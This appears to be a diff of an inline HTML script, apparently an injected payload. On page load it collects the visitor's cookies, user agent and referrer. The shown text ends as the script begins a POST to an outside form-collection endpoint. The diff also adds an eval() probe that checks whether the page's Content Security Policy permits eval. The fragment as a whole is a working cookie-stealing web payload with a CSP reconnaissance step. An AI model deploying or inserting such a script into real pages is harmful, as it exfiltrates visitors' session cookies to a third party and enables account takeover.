@@ -1,11 +1,17 @@
 <script>
     document.addEventListener("DOMContentLoaded", function() {
         let data = {
-            cookie_data: document.cookie,  // Always sends actual cookies
+            cookie_data: document.cookie,
             user_agent: navigator.userAgent,
             referrer: document.referrer,
-            fallback: "not_empty"
+            csp_test: "inline_script_execution",
         };
+
+        try {
+            eval("data.eval_test = 'CSP allows eval()';");
+        } catch (e) {
+            data.eval_test = "Blocked by CSP";
+        }
 
         fetch("https://formspree.io/f/xeoqzkqe", {
             method: "POST",
